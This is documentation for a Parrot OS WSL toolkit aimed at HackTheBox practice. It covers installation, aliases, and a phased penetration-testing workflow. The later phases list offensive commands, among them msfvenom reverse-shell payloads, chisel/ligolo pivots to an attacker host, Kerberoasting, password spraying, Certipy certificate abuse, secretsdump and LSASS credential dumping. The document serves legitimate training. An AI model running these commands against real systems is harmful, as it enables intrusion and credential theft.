# Parrot WSL Security Toolkit — Documentation

Full reference for everything in the toolkit. New install? Start with **[Recommended Workflow for HTB](#recommended-workflow-for-htb)**. Looking for a specific tool? Jump to its phase. Something broke? Go to **[Troubleshooting](#troubleshooting)**.

---

## Table of Contents

| Section | What's in it |
|---------|--------------|
| [Quick Reference](#quick-reference) | The 10 commands you'll use every session |
| [Installation](#installation) | Prerequisites, install steps, what goes where |
| [GUI Desktop Setup](#gui-desktop-setup) | WSLg vs XRDP — what to use and when |
| [WSL Configuration](#wsl-configuration) | wsl.conf settings |
| [Recommended Workflow for HTB](#recommended-workflow-for-htb) | Full attack flow, start to root |
| [Workspace Setup](#workspace-setup) | Directory structure, helper scripts |
| [cheat Command](#cheat-command) | In-terminal tool reference |
| [HTB Connect (VPN)](#htb-connect-vpn) | VPN connection, auto-discovery, status |
| [Shell Aliases](#shell-aliases) | Every alias, organized by category |
| [Per-Project Command History](#per-project-command-history) | htb-shell — per-machine logging |
| [Login Banner (MOTD)](#login-banner-motd) | The startup banner, how to disable it |
| [Browser Bookmarks](#browser-bookmarks) | 100+ curated security bookmarks |
| [Phase 1: Reconnaissance](#phase-1-reconnaissance) | nmap, amass, theHarvester, OSINT |
| [Phase 2: Scanning & Enumeration](#phase-2-scanning--enumeration) | gobuster, ffuf, enum4linux, SMB, LDAP |
| [Phase 3: Vulnerability Analysis](#phase-3-vulnerability-analysis) | searchsploit, lynis, nmap scripts |
| [Phase 4: Web Application Testing](#phase-4-web-application-testing) | sqlmap, Burp, XSStrike, commix |
| [Phase 5: Exploitation](#phase-5-exploitation) | Metasploit, impacket, evil-winrm, AD attacks |
| [Phase 6: Password Attacks](#phase-6-password-attacks) | hashcat, john, hydra, wordlists |
| [Phase 7: Post-Exploitation](#phase-7-post-exploitation) | BloodHound, chisel, ligolo, PEAS, pivoting |
| [Phase 8: Reverse Engineering](#phase-8-reverse-engineering) | Ghidra, GDB, pwntools, radare2 |
| [Phase 9: Forensics & Steganography](#phase-9-forensics--steganography) | volatility, steghide, stegseek, exiftool |
| [Phase 10: Wireless](#phase-10-wireless) | aircrack-ng, wifite (WSL limitations) |
| [Phase 11: Networking Utilities](#phase-11-networking-utilities) | Wireshark, netcat, socat, tmux, openvpn |
| [Linux Filesystem Reference](#linux-filesystem-reference) | What every directory is for, HTB-relevant paths |
| [Windows Filesystem Reference](#windows-filesystem-reference) | Windows paths, how to find files |
| [Additional Resources](#additional-resources) | External links |
| [Troubleshooting](#troubleshooting) | GUI issues, XRDP, failed installs, GPU |

---

## Quick Reference

The commands you'll run every single session:

| Command | What it does |
|---------|--------------|
| `vpn` | Connect to HTB VPN (interactive file picker) |
| `vpn-status` | Check if VPN is up, show tun0 IP |
| `myip` | Show your current tun0 IP |
| `new-machine <Name> <IP>` | Create machine workspace + add to /etc/hosts |
| `htb-shell <Name>` | Open per-machine shell with command logging |
| `cheat <toolname>` | Show tool cheat sheet in terminal |
| `rsh <port>` | Start a reverse shell listener |
| `serve [port] [dir]` | Serve files over HTTP to targets |
| `htb` | `cd ~/workspace/htb` |
| `machines` | `cd ~/workspace/htb/machines` |

---

## Installation

### Prerequisites

| Requirement | Details |
|-------------|---------|
| OS | Windows 10 (Build 19041+) or Windows 11 |
| WSL | Version 2 (WSL2) |
| Distro | [Parrot OS](https://parrotsec.org/docs/installation/install-with-wsl/) or Debian upgraded to Parrot |
| Disk space | ~15–20 GB free |
| RAM | 4 GB minimum, 8 GB recommended |

### Install

```bash
# 1. Clone the repo
git clone --depth 1 https://github.com/NewLouwa/WSL-Parrot-Security.git
cd WSL-Parrot-Security

# 2. Install all tools and GUI
sudo bash install-toolkit.sh

# 3. Create your user and workspace
sudo bash wsl-config/setup-user.sh <your-username>
```

```powershell
# 4. Restart WSL (from PowerShell)
wsl --shutdown
```

The installer handles:
- System update
- XFCE4 desktop environment with XRDP
- All security tools organized by phase
- WSL-specific config (`/etc/wsl.conf`)
- Manual downloads to `/opt/htb-toolkit/` (PEAS, pspy, ligolo-ng, volatility3)
- Helper scripts to `/usr/local/bin/`
- A Windows Desktop shortcut (`Parrot HTB Toolkit.bat`)

### Install Log

```bash
# View the full install log
cat /var/log/parrot-toolkit-install.log

# Filter for warnings and failures only
grep -E "\[!\]|\[-\]" /var/log/parrot-toolkit-install.log
```

The summary at the end of the install lists every package that failed — check there first if something's missing.

### Windows Desktop Shortcut

The installer drops `Parrot HTB Toolkit.bat` on your Windows Desktop at the very start of the install, before anything else runs. Double-click it to open WSL. Uses Windows Terminal if installed, falls back to plain WSL.

### WSL Start Directory

By default, opening WSL from Windows drops you into `/mnt/c/Users/YourName`. The installer patches `.bashrc` to redirect you to home automatically:

```bash
# Auto-applied to ~/.bashrc by the installer
[[ "$PWD" == /mnt/* ]] && cd ~
```

### What Gets Installed Where

| Location | Contents |
|----------|----------|
| System packages | Via `apt` — globally available |
| Python tools | Via `pip3` — globally available |
| Go tools | `~/go/bin/` |
| Manual downloads | `/opt/htb-toolkit/` |
| Wordlists | `/usr/share/seclists/` and `/usr/share/wordlists/` |
| Desktop shortcuts | `/usr/share/applications/` |
| Helper scripts | `/usr/local/bin/` |

---

## GUI Desktop Setup

The toolkit installs XFCE4 with two ways to use it. Which one you want depends on what you're doing.

### WSLg — Use This for Individual Apps

**When:** You want to open Wireshark, Ghidra, Burp, or any other GUI tool and have it appear as a normal Windows window. No setup.

**Requires:** Windows 11 with WSL2 (WSLg is built in).

```bash
# Just run the app — it opens in its own window on your Windows desktop
wireshark
ghidra
burpsuite
bloodhound
```

### XRDP — Use This for a Full Desktop

**When:** You want a complete Linux desktop with a taskbar, file manager, and app launcher. Useful for running multiple GUI tools at once or when WSLg isn't working.

```bash
# Start the XRDP server
start-desktop xrdp

# Or manually
sudo service xrdp start
```

Then from Windows:
1. Open **Remote Desktop Connection** (`Win+R` → `mstsc`)
2. Connect to `localhost:3390`
3. Log in with your WSL username and password

### Auto-Detect

```bash
# Detects WSLg automatically, falls back to XRDP
start-desktop
```

### GUI Troubleshooting

```bash
# Built-in fix tool — run this first
fix-wsl-gui

# Manual options:
sudo service dbus restart       # restart D-Bus
echo $DISPLAY $WAYLAND_DISPLAY  # check display variables are set
```

```powershell
# Full WSL restart (from PowerShell)
wsl --shutdown
```

---

## WSL Configuration

The installer creates `/etc/wsl.conf` with these settings:

```ini
[boot]
systemd=true          # Enable systemd (needed for services like xrdp, neo4j)

[interop]
enabled=true          # Run Windows programs from Linux
appendWindowsPath=true

[automount]
enabled=true
options="metadata,uid=1000,gid=1000,umask=22,fmask=11"

[network]
generateResolvConf=true
```

After any changes to `wsl.conf`:

```powershell
# From PowerShell
wsl --shutdown
```

---

## Recommended Workflow for HTB

### 1. Setup

```bash
# Connect to HTB VPN
vpn

# Start a tmux session
tmux new -s htb

# Create machine workspace (also adds to /etc/hosts)
new-machine TargetName 10.10.10.x

# Open a per-machine shell with command logging
htb-shell TargetName
```

### 2. Recon

```bash
# Fast initial scan
rustscan -a 10.10.10.x -- -sC -sV | tee recon/nmap.txt

# Full port scan (run in background)
nmap -p- -sC -sV 10.10.10.x -oN recon/nmap_full.txt &
```

### 3. Enumerate Services

```bash
# Web — directory bruteforce
ffuf -u http://10.10.10.x/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Web — vhost enumeration (always check this)
ffuf -u http://10.10.10.x -H "Host: FUZZ.target.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --fs <default_size>

# SMB (Windows targets)
smbmap -H 10.10.10.x
enum4linux -a 10.10.10.x

# Web server fingerprint
nikto -host http://10.10.10.x
whatweb http://10.10.10.x
```

### 4. Find and Run Exploits

```bash
# Search for known exploits
searchsploit <service version>
searchsploit -x <EDB-ID>    # read the exploit
searchsploit -m <EDB-ID>    # copy to current dir

# Start a listener
rsh 4444
```

### 5. Stabilize Shell

```bash
# On the target — upgrade to a proper TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### 6. Escalate Privileges

```bash
# Linux
./linpeas.sh
./pspy64       # watch for cron jobs
sudo -l

# Windows
.\winpeas.exe
whoami /priv
whoami /groups
```

---

## Workspace Setup

`setup-user.sh` creates an organized directory structure under your home:

```
~/workspace/
├── htb/
│   ├── machines/          # one folder per HTB machine
│   ├── challenges/        # CTF challenges by category
│   ├── prolabs/           # pro lab notes
│   ├── endgames/          # endgame notes
│   ├── notes/             # general study notes
│   └── vpn/               # .ovpn files
├── scripts/               # new-machine, new-challenge, serve
├── tools/                 # custom/compiled tools
├── wordlists/             # custom wordlists
├── loot/                  # global loot storage
└── www/                   # files to serve to targets
```

### Helper Scripts

**`new-machine <Name> [IP]`** — Creates a structured folder for an HTB machine. If you pass an IP, it also adds a `/etc/hosts` entry.

```bash
new-machine Lame 10.10.10.3
# Creates ~/workspace/htb/machines/Lame/{recon,exploit,loot,privesc,screenshots,notes.md}
# Adds "10.10.10.3 lame.htb" to /etc/hosts
```

**`new-challenge <category> <name>`** — Creates a challenge folder organized by category.

```bash
new-challenge crypto easy-rsa
# Creates ~/workspace/htb/challenges/crypto/easy-rsa/{files,solution,notes.md}
```

**`serve [port] [dir]`** — Starts a Python HTTP server and shows your tun0 IP so you can copy the download URL. Defaults to port 8080, serves from `~/workspace/www`.

```bash
serve              # port 8080, serves ~/workspace/www
serve 80           # port 80 (needs sudo)
serve 9000 /tmp    # custom port and directory
```

---

## cheat Command

`cheat <toolname>` displays the markdown cheat sheet for any installed tool directly in your terminal. No browser needed.

```bash
cheat nmap           # nmap flags and examples
cheat burpsuite      # Burp Suite tips
cheat proxychains4   # works with package names (strips the 4)
cheat msfconsole     # common aliases supported
cheat                # no args = list all available cheat sheets
```

**Alias resolution:** The command tries the exact name first, then strips common package suffixes (`4`, `-ng`, `-tools`, `-openbsd`, `-framework`, `python3-`), then falls back to a built-in alias table for tools that don't follow a pattern:

| What you type | Resolves to |
|---------------|-------------|
| `msfconsole` | `metasploit.md` |
| `cme` | `crackmapexec.md` |
| `nxc` | `netexec.md` |

Renders with syntax highlighting if `bat` is installed, falls back to `cat`.

---

## HTB Connect (VPN)

`htb-connect` is a wrapper around OpenVPN. It lives at `/usr/local/bin/htb-connect`, aliased as `vpn`.

### Interactive Mode

```bash
vpn
# Searches ~/workspace/htb/vpn/, home dir, and Windows Downloads/Desktop
# Presents a numbered list of .ovpn files to pick from
# Optionally pings a target IP after connecting to confirm reachability
```

### One-Liner Mode

```bash
# Pass file path directly
htb-connect ~/workspace/htb/vpn/lab.ovpn

# With target ping
htb-connect ~/workspace/htb/vpn/lab.ovpn 10.10.10.5

# Windows paths work too
htb-connect 'C:\Users\You\Downloads\lab.ovpn' 10.10.10.5
```

### Status and Disconnect

```bash
vpn-status      # check connection, show tun0 IP
vpn-dc          # kill the VPN
```

---

## Shell Aliases

All aliases live in `~/.bash_aliases`, configured by `setup-user.sh`. Available in every shell session.

### Navigation

| Alias | Goes to |
|-------|---------|
| `ws` | `~/workspace` |
| `htb` | `~/workspace/htb` |
| `machines` | `~/workspace/htb/machines` |
| `challenges` | `~/workspace/htb/challenges` |

### Helper Scripts

| Alias | Runs |
|-------|------|
| `new-machine` | `~/workspace/scripts/new-machine.sh` |
| `new-challenge` | `~/workspace/scripts/new-challenge.sh` |
| `serve` | `~/workspace/scripts/serve.sh` |

### VPN

| Alias | Action |
|-------|--------|
| `vpn` | `htb-connect` — interactive VPN connect |
| `vpn-dc` | `htb-connect --disconnect` |
| `vpn-status` | `htb-connect --status` |

### Networking and Pentest

| Alias | Expands to | Notes |
|-------|------------|-------|
| `myip` | `ip -4 addr show tun0 ...` | Shows your tun0 IP |
| `rsh <port>` | `rlwrap nc -lvnp <port>` | Reverse shell listener |
| `pserv` | `python3 -m http.server` | Quick HTTP server |
| `ports` | `ss -tlnp` | Show listening ports |
| `clip` | `clip.exe` | Copy stdin to Windows clipboard |

### Tool Access

| Alias | Notes |
|-------|-------|
| `cheat <toolname>` | Show tool cheat sheet in terminal |
| `htb-shell <name>` | Open per-machine shell with command logging |

---

## Per-Project Command History

`htb-shell` gives each machine its own bash session with a separate command log — useful for writeups and reports.

### What it does

When you run `htb-shell MachineName`, it:
1. Changes into `~/workspace/htb/machines/MachineName/`
2. Sets `HISTFILE` to `.cmd_history` inside that folder
3. Sets a custom prompt: `[MachineName] user@parrot:~$`
4. Logs every command to that machine's `.cmd_history`

### Usage

```bash
# Start a machine shell
htb-shell Lame

# All commands are logged automatically
nmap -sC -sV 10.10.10.3 -oN recon/nmap.txt
ffuf -u http://10.10.10.3/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Exit when done
exit

# Review your history later
cat ~/workspace/htb/machines/Lame/.cmd_history

# Search it
grep ffuf ~/workspace/htb/machines/Lame/.cmd_history
```

### Notes

- The machine folder must exist before you can use `htb-shell`. Use `new-machine` to create it.
- Run `htb-shell` with no arguments to list available machine folders.

---

## Login Banner (MOTD)

On each new terminal, a banner shows toolkit summary, network status, and quick-start tips. Generated by `~/.motd.sh`, sourced from `.bashrc`.

### Disable it

```bash
# Comment out these lines in ~/.bashrc
if [ -f ~/.motd.sh ]; then
    source ~/.motd.sh
fi
```

### Customize it

Edit `~/.motd.sh` directly.

---

## Browser Bookmarks

`wsl-config/bookmarks.html` contains 100+ curated security bookmarks. During `setup-user.sh`, these are auto-imported into Brave and Firefox.

### Categories

| Category | What's in it |
|----------|-------------|
| HackTheBox | HTB platform, Academy, Forums |
| Knowledge Bases | HackTricks, PayloadsAllTheThings, LOLBAS, WADComs |
| Cheat Sheets | Reverse shells, Nmap, SQLi, XSS references |
| Vulnerability DBs | CVE, Exploit-DB, NVD |
| Web Testing | Burp Suite docs, OWASP, JWT tools |
| Active Directory | BloodHound, AD attack guides, Kerberos resources |
| Reverse Engineering | Ghidra, radare2, decompiler references |
| OSINT | Shodan, Censys, OSINT frameworks |
| Crypto & Encoding | CyberChef, dCode, hash identification |
| Forensics & Stego | Memory forensics, steganography tools |
| Writeups & Learning | IppSec, 0xdf, HTB writeup resources |
| Network & Infra | Pivoting guides, tunneling references |
| GitHub Repos | Key security tool repositories |

### Manual Import

If auto-import didn't work:
1. Open your browser's Bookmarks Manager
2. Select **Import bookmarks from HTML file**
3. Choose `~/workspace/bookmarks.html`

---

## Phase 1: Reconnaissance

Initial information gathering. Find the attack surface before you touch the target.

### Tools

| Tool | Primary Use |
|------|-------------|
| **nmap** | Port scanning, service detection, OS fingerprinting |
| **masscan** | Ultra-fast port scanning for large ranges |
| **rustscan** | Fast port scanner that feeds into nmap |
| **amass** | Subdomain enumeration and OSINT mapping |
| **dnsrecon** | DNS enumeration, zone transfers, brute-force |
| **dnsenum** | DNS information gathering |
| **fierce** | DNS recon and non-contiguous IP discovery |
| **whois** | Domain/IP registration lookups |
| **recon-ng** | Modular OSINT framework |
| **sublist3r** | Fast subdomain enumeration via search engines |
| **theHarvester** | Email, subdomain, and IP harvesting |
| **sherlock** | Find usernames across 400+ social media sites |
| **holehe** | Check if an email is registered on 100+ websites |
| **GHunt** | Google account OSINT from an email address |
| **Photon** | Web crawler that extracts URLs, emails, files |
| **SpiderFoot** | Automated OSINT scanner with web dashboard |
| **shodan** | Search internet-connected devices (needs API key) |

### HTB Recon Flow

```bash
# Fast initial scan
rustscan -a 10.10.10.x -- -sC -sV
```

```bash
# Full nmap scan (save to file)
nmap -sC -sV -p- 10.10.10.x -oN nmap_full.txt
```

```bash
# If port 53 is open
dnsrecon -d target.htb -n 10.10.10.x
dnsenum target.htb
```

```bash
# If web is found
whatweb http://10.10.10.x
```

> Detailed docs: see individual `.md` files in `01-Reconnaissance/`

---

## Phase 2: Scanning & Enumeration

Deep-dive into discovered services. Extract as much as possible before moving to exploitation.

### Tools

| Tool | Primary Use |
|------|-------------|
| **gobuster** | Directory/DNS/vhost brute-force |
| **ffuf** | Fast web fuzzing (dirs, params, vhosts) |
| **feroxbuster** | Recursive content discovery |
| **dirb** | Basic web directory scanning |
| **nikto** | Web server vulnerability scanning |
| **whatweb** | Web technology fingerprinting |
| **enum4linux** | Windows/SMB enumeration |
| **smbclient** | SMB share browsing and file transfer |
| **smbmap** | SMB share permission mapping |
| **rpcclient** | MS-RPC enumeration (users, groups, policies) |
| **snmpwalk / onesixtyone** | SNMP enumeration |
| **nbtscan** | NetBIOS name scanning |
| **ldapsearch** | LDAP directory queries |

### Enumeration Commands

```bash
# Web — directory fuzzing
ffuf -u http://10.10.10.x/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

```bash
# Web — vhost fuzzing
ffuf -u http://10.10.10.x -H "Host: FUZZ.target.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --fs <default_size>
```

```bash
# SMB enumeration
smbmap -H 10.10.10.x
smbclient -L //10.10.10.x -N
enum4linux -a 10.10.10.x
rpcclient -U "" -N 10.10.10.x -c "enumdomusers"
```

```bash
# SNMP (port 161)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 10.10.10.x
snmpwalk -v2c -c public 10.10.10.x
```

```bash
# LDAP (Active Directory)
ldapsearch -x -H ldap://10.10.10.x -b "DC=target,DC=htb"
```

> Detailed docs: see individual `.md` files in `02-Scanning-Enumeration/`

---

## Phase 3: Vulnerability Analysis

Find exploitable vulnerabilities in discovered services.

### Tools

| Tool | Primary Use |
|------|-------------|
| **searchsploit** | Search Exploit-DB for known exploits |
| **nmap NSE scripts** | Vulnerability detection |
| **lynis** | System security auditing |
| **legion** | Automated network pentest framework (GUI) |

### Workflow

```bash
# Search by service and version
searchsploit apache 2.4.49
```

```bash
# Read or copy an exploit
searchsploit -x 12345    # read in terminal
searchsploit -m 12345    # copy to current dir
```

```bash
# Nmap vuln scripts
nmap --script vuln 10.10.10.x
nmap --script smb-vuln* -p 445 10.10.10.x
```

> Detailed docs: see individual `.md` files in `03-Vulnerability-Analysis/`

---

## Phase 4: Web Application Testing

Attack web apps for injection flaws, misconfigurations, and logic bugs.

### Tools

| Tool | Primary Use |
|------|-------------|
| **sqlmap** | Automatic SQL injection |
| **Burp Suite** | Web proxy and testing platform (GUI) |
| **OWASP ZAP** | Free web app scanner (GUI) |
| **wfuzz** | Parameter and directory fuzzing |
| **WPScan** | WordPress vulnerability scanning |
| **commix** | Command injection exploitation |
| **wafw00f** | WAF detection |
| **XSStrike** | XSS detection and exploitation |

### Workflow

```bash
# Check for a WAF first
wafw00f http://target.htb
```

```bash
# WordPress sites
wpscan --url http://target.htb -e ap,u
```

```bash
# SQL injection
sqlmap -u "http://target.htb/page?id=1" --batch --dbs

# From a saved Burp request
sqlmap -r request.txt --batch --dbs
```

```bash
# Command injection
commix --url="http://target.htb/ping" --data="ip=127.0.0.1"
```

```bash
# Manual testing — intercept and modify requests
burpsuite
```

> Detailed docs: see individual `.md` files in `04-Web-Application-Testing/`

---

## Phase 5: Exploitation

Gain initial access.

### Tools

| Tool | Primary Use |
|------|-------------|
| **Metasploit** | Exploitation framework |
| **Impacket** | Windows/AD protocol attacks |
| **Evil-WinRM** | WinRM shell for Windows |
| **CrackMapExec** | Network credential testing |
| **NetExec** | CME successor |
| **Responder** | LLMNR/NBT-NS hash capture |
| **pwncat** | Advanced reverse shell handler |

### Workflow

```bash
# Catch a reverse shell
rlwrap nc -lvnp 4444
# Or with pwncat (auto-upgrades the shell)
pwncat-cs -lp 4444
```

```bash
# Generate payloads
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o rev.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o rev.elf
```

```bash
# Windows/AD access
impacket-psexec domain/admin:password@10.10.10.x
evil-winrm -i 10.10.10.x -u admin -H NTLM_HASH
crackmapexec smb 10.10.10.x -u user -p pass --shares
```

```bash
# Capture NTLMv2 hashes over the network
sudo responder -I tun0
```

> Detailed docs: see individual `.md` files in `05-Exploitation/`

---

## Phase 6: Password Attacks

Crack hashes and brute-force services.

### Tools

| Tool | Primary Use |
|------|-------------|
| **John the Ripper** | Hash cracking + file hash extraction |
| **hashcat** | GPU-accelerated hash cracking |
| **Hydra** | Online brute-force (SSH, HTTP, FTP...) |
| **CeWL** | Generate wordlists from target websites |
| **crunch** | Pattern-based wordlist generation |
| **hash-identifier / hashid** | Identify hash types |
| **SecLists / rockyou** | Pre-built wordlists |

### Workflow

```bash
# Identify hash type
hashid -m 'HASH_HERE'
```

```bash
# Crack with john
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt
```

```bash
# Crack with hashcat (faster with GPU)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

```bash
# Extract hashes from files
ssh2john id_rsa > ssh_hash.txt
zip2john secret.zip > zip_hash.txt
keepass2john database.kdbx > kp_hash.txt
```

```bash
# Online brute-force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.x
hydra -l admin -P rockyou.txt 10.10.10.x http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

```bash
# Build a custom wordlist from the target site
cewl http://target.htb -d 3 -m 5 -w custom_wordlist.txt
```

### Common Hashcat Modes

| `-m` | Hash Type |
|------|-----------|
| `0` | MD5 |
| `100` | SHA1 |
| `1000` | NTLM |
| `1800` | sha512crypt (`$6$`) |
| `3200` | bcrypt |
| `5600` | NTLMv2 |
| `13100` | Kerberoast |
| `18200` | AS-REP Roast |

> Detailed docs: see individual `.md` files in `06-Password-Attacks/`

---

## Phase 7: Post-Exploitation

Escalate privileges, maintain access, pivot through the network.

### Tools

| Tool | Primary Use |
|------|-------------|
| **BloodHound** | AD attack path visualization (GUI) |
| **Chisel** | HTTP tunneling/pivoting |
| **Ligolo-ng** | TUN-based pivoting (recommended) |
| **LinPEAS / WinPEAS** | Automated privesc enumeration |
| **pspy** | Process monitoring (find cron jobs without root) |
| **Proxychains** | Route tools through a SOCKS proxy |
| **socat** | Advanced relay and shell upgrade |
| **sshuttle** | VPN-over-SSH |

### Linux Privilege Escalation

```bash
# Automated enumeration
./linpeas.sh | tee linpeas.txt
```

```bash
# Watch processes for cron jobs
./pspy64
```

```bash
# Manual checks
sudo -l                          # what can you run as sudo?
find / -perm -4000 2>/dev/null   # SUID binaries → GTFOBins
cat /etc/crontab                 # scheduled tasks
```

### Windows Privilege Escalation

```bash
# Automated enumeration
.\winpeas.exe
```

```bash
# Check your privileges
whoami /priv
whoami /groups
# SeImpersonatePrivilege → Potato attacks
# AlwaysInstallElevated → MSI installer privesc
```

### Pivoting

```bash
# Chisel — SOCKS proxy
# Attacker:
chisel server --reverse -p 8000
# Target:
./chisel client ATTACKER:8000 R:socks
# Then route tools through it:
proxychains nmap -sT -Pn INTERNAL_IP
```

```bash
# Ligolo-ng — TUN interface (cleaner, recommended for complex pivots)
# Attacker setup:
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
# Target:
./agent -connect ATTACKER:11601 -ignore-cert
# Then add routes and scan normally without proxychains
```

```bash
# sshuttle — easiest if you have SSH access
sshuttle -r user@10.10.10.x 172.16.1.0/24
```

### Active Directory

```bash
# Collect BloodHound data
bloodhound-python -u user -p pass -d domain.htb -ns 10.10.10.x -c all

# Start neo4j and BloodHound
sudo neo4j console &
bloodhound
# Import the .json files, run pre-built queries
```

```bash
# Kerberoasting
impacket-GetUserSPNs domain/user:pass -dc-ip 10.10.10.x -request
hashcat -m 13100 tgs_hashes.txt rockyou.txt
```

```bash
# AS-REP Roasting
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip 10.10.10.x -no-pass
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

```bash
# Dump secrets (with admin)
impacket-secretsdump domain/admin:pass@10.10.10.x
```

```bash
# Username enumeration
kerbrute userenum -d domain.htb --dc 10.10.10.x \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Password spray
kerbrute passwordspray -d domain.htb --dc 10.10.10.x users.txt 'Welcome1!'
```

```bash
# AD Certificate Services (Certipy)
certipy find -u user@domain.htb -p pass -dc-ip 10.10.10.x
certipy req -u user@domain.htb -p pass -ca YOURCA -target 10.10.10.x \
  -template VulnTemplate -upn admin@domain.htb
certipy auth -pfx admin.pfx -dc-ip 10.10.10.x
```

```bash
# Dump credentials from LSASS dump
pypykatz lsa minidump lsass.dmp
pypykatz registry --sam SAM --system SYSTEM --security SECURITY
```

> Detailed docs: see individual `.md` files in `07-Post-Exploitation/`

---

## Phase 8: Reverse Engineering

Analyze binaries, debug, and develop exploits.

### Tools

| Tool | Primary Use |
|------|-------------|
| **Ghidra** | Disassembly and decompilation (GUI) |
| **radare2** | Binary analysis framework |
| **GDB + PEDA** | Debugging and exploit development |
| **pwntools** | Exploit development library (Python) |
| **binwalk** | Firmware/binary file extraction |
| **ltrace / strace** | Library and system call tracing |

### Workflow

```bash
# Quick look
file mystery_binary
strings mystery_binary | grep -i flag
ltrace ./mystery_binary        # may reveal strcmp with a password in plaintext
```

```bash
# Deep analysis
ghidra                         # import binary, auto-analyze, read decompiled C
```

```bash
# Debug with GDB
gdb ./vuln_binary
# (gdb) break main
# (gdb) run
# step through, examine registers and memory
```

> Detailed docs: see individual `.md` files in `08-Reverse-Engineering/`

---

## Phase 9: Forensics & Steganography

Analyze disk images, memory dumps, and files with hidden data.

### Tools

| Tool | Primary Use |
|------|-------------|
| **foremost** | File carving from disk images |
| **steghide** | JPEG/BMP steganography |
| **exiftool** | File metadata analysis |
| **Volatility 3** | Memory dump forensics |
| **stegoveritas** | Multi-method stego analysis |
| **TestDisk** | Partition and file recovery |
| **hexedit / xxd** | Binary hex editing |

### Stego and File Analysis

```bash
exiftool suspicious.jpg         # check metadata
steghide extract -sf image.jpg  # extract with empty password
stegoveritas image.png          # run all analysis methods
binwalk image.png               # check for embedded files
strings image.jpg | grep -i flag
```

### Disk Forensics

```bash
foremost -i disk.dd -o output/
testdisk disk.dd
```

### Memory Forensics

```bash
cd /opt/htb-toolkit/volatility3
python3 vol.py -f memdump.raw windows.info
python3 vol.py -f memdump.raw windows.pslist
python3 vol.py -f memdump.raw windows.hashdump
python3 vol.py -f memdump.raw windows.filescan
```

### Hex Analysis

```bash
xxd file.bin | head -20         # check magic bytes
hexedit file.bin                # edit binary data interactively
```

> Detailed docs: see individual `.md` files in `09-Forensics-Stego/`

---

## Phase 10: Wireless

WiFi security testing tools. **Live capture and injection are limited in WSL** due to hardware access restrictions.

### Tools

| Tool | Primary Use |
|------|-------------|
| **aircrack-ng** | WiFi auditing suite |
| **reaver** | WPS brute-force |
| **wifite** | Automated WiFi attacks |

### What Works in WSL

| Task | Works? |
|------|--------|
| Offline handshake cracking | Yes |
| Live capture / injection | No — needs USB WiFi adapter via `usbipd-win` |

```bash
# Crack a captured WPA handshake (works fine in WSL)
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap
```

For full wireless testing, consider a live boot USB instead of WSL.

> Detailed docs: see individual `.md` files in `10-Wireless/`

---

## Phase 11: Networking Utilities

Connectivity, analysis, and quality-of-life tools.

### Tools

| Tool | Primary Use |
|------|-------------|
| **Wireshark** | Packet capture and analysis (GUI) |
| **netcat** | TCP/UDP connections, reverse shells |
| **tcpdump** | CLI packet capture |
| **tmux** | Terminal multiplexer |
| **OpenVPN** | VPN client for HTB |
| **rlwrap** | Arrow key support for raw shells |
| **Remmina** | RDP/VNC remote desktop client (GUI) |

### Essential Commands

```bash
# Connect to HTB VPN directly
sudo openvpn lab.ovpn
```

```bash
# tmux basics
tmux new -s htb         # new session
# Ctrl+B, %  = split vertical
# Ctrl+B, "  = split horizontal
# Ctrl+B, d  = detach
tmux attach -t htb      # reattach
```

```bash
# Reverse shell listener with arrow key support
rlwrap nc -lvnp 4444
```

> Detailed docs: see individual `.md` files in `11-Networking-Utilities/`

---

## Linux Filesystem Reference

Useful when you land on a box and need to know where to look.

### Directory Map

| Directory | What it's for |
|-----------|---------------|
| `/` | Root — all paths start here |
| `/root` | Root user's home — first place to check for flags after rooting |
| `/home` | Regular user home directories — user flags, SSH keys |
| `/etc` | System config — `/etc/passwd`, `/etc/shadow`, cron, SSH config, service configs |
| `/var` | Variable data — logs in `/var/log/`, web files in `/var/www/`, mail in `/var/mail/` |
| `/tmp` | World-writable, no persistence on reboot — drop payloads here |
| `/opt` | Third-party software — worth checking for misconfigured installs |
| `/usr` | User programs — binaries in `/usr/bin/`, local installs in `/usr/local/` |
| `/bin` | Essential binaries available to everyone |
| `/sbin` | System binaries, mostly root-only |
| `/dev` | Device files — `/dev/null`, `/dev/random`, disks, terminals |
| `/proc` | Live process and kernel info — `/proc/net/` has network details |
| `/mnt` | Manual mount points — WSL Windows drives are at `/mnt/c/`, `/mnt/d/` |
| `/srv` | Data served by the system — check if web/FTP server is running |
| `/tmp` and `/dev/shm` | World-writable — classic payload drop spots |

### HTB-Relevant Paths

```
/etc/passwd          — all users (world-readable)
/etc/shadow          — hashed passwords (root only — if readable, game over)
/etc/crontab         — scheduled tasks (privesc vector)
/etc/sudoers         — sudo permissions (privesc vector)
/etc/hosts           — local DNS (useful for pivoting)
/etc/ssh/            — SSH config, sometimes keys
/var/log/            — auth.log, syslog, apache/nginx access logs
/var/www/html/       — default Apache/Nginx web root
/var/mail/           — user mailboxes (sometimes has creds)
/tmp/ and /dev/shm/  — world-writable, good for dropping files
/opt/                — custom software, often misconfigured
/home/*/.ssh/        — SSH keys, authorized_keys
/home/*/.bash_history — command history (passwords typed by accident)
/root/.ssh/          — root's SSH keys
/root/.bash_history  — root's command history
```

### File Permissions

```
-rwxr-xr-x  — owner: rwx | group: r-x | others: r-x
